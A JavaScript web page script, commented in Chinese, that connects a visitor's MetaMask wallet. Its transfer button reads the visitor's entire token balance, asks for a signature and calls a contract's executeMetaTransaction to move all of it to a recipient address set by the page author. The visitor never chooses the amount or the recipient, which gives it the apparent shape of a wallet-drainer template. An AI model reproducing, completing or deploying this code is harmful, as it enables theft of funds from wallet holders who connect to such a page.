const contractAddress = '0xa1f16EF58A572fB99e41bb2C21C26AdDd6828697';
const ABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            },
            {
                "internalType": "bytes",
                "name": "signature",
                "type": "bytes"
            }
        ],
        "name": "executeMetaTransaction",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let web3;
let account;
let isConnecting = false; // 新增标志

async function connectWallet() {
    if (window.ethereum) {
        if (isConnecting) return; // 如果正在连接，直接返回
        isConnecting = true; // 设置为正在连接状态
        document.getElementById('connectButton').innerText = '连接中...';
        document.getElementById('connectButton').disabled = true; // 禁用连接按钮

        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            if (accounts.length > 0) {
                account = accounts[0]; // 获取第一个账户
                web3 = new Web3(window.ethereum);
                document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
                document.getElementById('transferButton').disabled = false; // 启用转账按钮
                console.log('连接成功:', account);
            } else {
                throw new Error('未选择账户');
            }

            // 监听账户变化
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length > 0) {
                    account = accounts[0];
                    document.getElementById('connectButton').innerText = '连接成功';
                    console.log('账户已更改:', account);
                } else {
                    document.getElementById('connectButton').innerText = '连接钱包';
                    document.getElementById('transferButton').disabled = true; // 禁用转账按钮
                    console.log('用户已断开与钱包的连接');
                }
            });
        } catch (error) {
            console.error('连接钱包失败:', error);
            document.getElementById('connectButton').innerText = '连接失败'; // 更新按钮文本
            alert('连接钱包失败，请检查控制台错误信息。');
        } finally {
            isConnecting = false; // 请求结束，重置状态
            document.getElementById('connectButton').disabled = false; // 重新启用连接按钮
        }
    } else {
        alert('请安装 MetaMask 或其他钱包插件');
    }
}

async function transferTokens() {
    const recipient = '接收者地址'; // 这里指定接收者地址
    const contract = new web3.eth.Contract(ABI, contractAddress);
    
    try {
        const balance = await contract.methods.balanceOf(account).call();
        const amount = balance; // 将转账金额设为用户的所有余额

        console.log('用户余额:', balance);
        
        if (balance === '0') {
            alert('余额不足，无法转账。');
            return;
        }

        const amountToSend = web3.utils.toBN(amount);
        const messageHash = web3.utils.soliditySha3(account, recipient, amountToSend);
        const messageHashHex = web3.utils.keccak256(messageHash); // 使用 keccak256

        const signature = await web3.eth.personal.sign(messageHashHex, account);
        
        console.log('生成的消息哈希:', messageHashHex);
        console.log('签名:', signature);
        
        const tx = await contract.methods.executeMetaTransaction(account, recipient, amountToSend.toString(), signature).send({ from: account });
        
        console.log('转账成功:', tx);
        alert('转账成功！');
    } catch (error) {
        console.error('转账失败:', error);
        alert(`转账失败，请检查控制台错误信息: ${error.message}`);
    }
}

document.getElementById('connectButton').onclick = connectWallet;
document.getElementById('transferButton').onclick = transferTokens;
